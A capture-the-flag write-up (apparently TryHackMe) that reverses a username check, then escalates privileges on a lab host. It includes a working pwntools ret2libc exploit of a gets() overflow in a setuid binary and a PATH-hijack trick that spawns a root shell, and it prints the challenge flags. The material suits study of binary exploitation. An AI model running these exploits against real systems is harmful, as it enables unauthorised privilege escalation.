Target ip : 10.10.111.138
my ip       : 10.2.3.159

2 binaries 
```
angel_A
angel_B
```

---

angel_A :
```C
	wchar32 username[0x9] = "kym~humr", 0
	
	int32_t main(int32_t argc, char** argv, char** envp)
    {
        int32_t argc_1 = argc;
        char** argv_1 = argv;
        
        if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1)
        {
            printf("Using debuggers? Here is tutoria…");
            exit(1);
        }
        
        printf("\x1b[36m\nSay my username >> \x1b…");
        void buf;
        fgets(&buf, 9, __TMC_END__);
        int32_t var_c = 0;
        
        while (true)
        {
            if (var_c > 7)
            {
                puts("\x1b[32m\nCorrect! That is my na…");
                return 0;
            }
            
            if (username[(int64_t)var_c] != (int32_t)(*(uint8_t*)(&buf + (int64_t)var_c) ^ 4) + 8)
                break;
            
            var_c += 1;
        }
        
        puts("\x1b[31m\nThat is not my usernam…");
        exit(0);
        /* no return */
    }

```

Let's write a little prgram in C that invert this algorithm to get the username :
```C
int main()
{
	char *username = "kym~humr";
	char answer[8];
	
	int i = 0;
	while (i < 8)
	{
		answer[i] = (username[i] - 8) ^ 4;
		i++;
	}

	printf("Username is : %s\n", answer);
	return 0;
}
```

And we got the username : guardian

---
Let's see the angel_B file now,

```bash
file angel_B

angel_B: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=Xd_LgpWItJBNJmN63lQy/oWW_4FYae77KCrbbrcIX/2pmyS7gUszdXBsoOAYWo/PyEjnQ2VYI7PIdiOmGXg, not stripped

```
It's a Go program

The flag can be found in the decompiler : GOg0esGrrr!

We can now connect in SSH to ip address of the target.

---
```bash
guardian@heaven:~$ ls
guardian_flag.txt  pwn_me

```

We can see that pwn_me belongs to the user binexgod, the one we want to become. Let's try to abuse the binary to execute a shell from it and become binexgod.

---
That's how the code looks in pseudo C
```C
    char* vuln()
    {
        puts("Binexgod said he want to make th…");
        printf("System is at: %lp\n", system);
        void buf;
        return gets(&buf);
    }


    int32_t main(int32_t argc, char** argv, char** envp)
    {
        void* const __return_addr_1 = __return_addr;
        int32_t* var_14 = &argc;
        uid_t euid = getuid();
        setreuid(geteuid(), euid);
        vuln();
        return 0;
    }


	(ASLR Activated)
```

Lets find the offset with gdb and cyclic :
```bash
cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Put this into a file : /tmp/inp

$ gdb -q ./pwm_me
$ r < /tmp/inp
Cannot access memory at address 0x61616169

cyclic -l 0x61616169
32
```

The offset size is 32 bytes.

---

Let's write a python exploit :
```python
from pwn import *

elf = context.binary = ELF('./pwn_me')
libc = elf.libc

p = process()
p.recvuntil('at: ')

system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success('LIBS base: {}'.format(hex(libc.address)))

binsh = next(libc.search(b'/bin/sh'))

rop = ROP(libc)
rop.raw('A' * 32)
rop.system(binsh)

p.sendline(rop.chain())
  
p.interactive()
```

Grace a fonction vuln() l'addresse de la fonction system est fuite. On peut donc EN RUNTIME connaitre la base de notre libc grace a
```
libc.address = system_leak - libc.sym['system']
```

Ensuite gets n'est pas proteger et permet d'ecrire sur l'addresse de retour afin de rediriger le programme vers notre chaine ROP.
```
[ buf (32 octets de padding) ]
+-------------------------+
| Adresse : pop rdi; ret  |  ← écrasée sur la sauvegarde du RIP
+-------------------------+
| Valeur : binsh (RDI)    |  ← sera poppée dans RDI
+-------------------------+
| Adresse : system        |  ← retour qui va appeler system
+-------------------------+
| (Eventuellement un "fake" return pour system) |
+-------------------------+

```

The exploit gives us a shell as binexgod :
```bash
Flag : THM{b1n3xg0d_pwn3d}
```

----
This the code to exploit :
```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
	gid_t gid;
	uid_t uid;
	gid = getegid();
	uid = geteuid();

	setresgid(gid, gid, gid);
	setresuid(uid, uid, uid);

	system("/usr/bin/env echo Get out of heaven lol");
}

```

Let's create a C file :
```c
#include<stdio.h>
#include<stdlib.h>

int main()
{
	system("/bin/bash");
}
```

Let's compile it and move it in /tmp:
```bash
gcc -o echo echo.c
mv echo /tmp
```

Let's export /tmp is the PATH environment variable
```bash
export PATH=/tmp:$PATH
```

Now let's run vuln  and get a root shell !
```
Root flag : THM{r00t_of_th3_he4v3n}
```


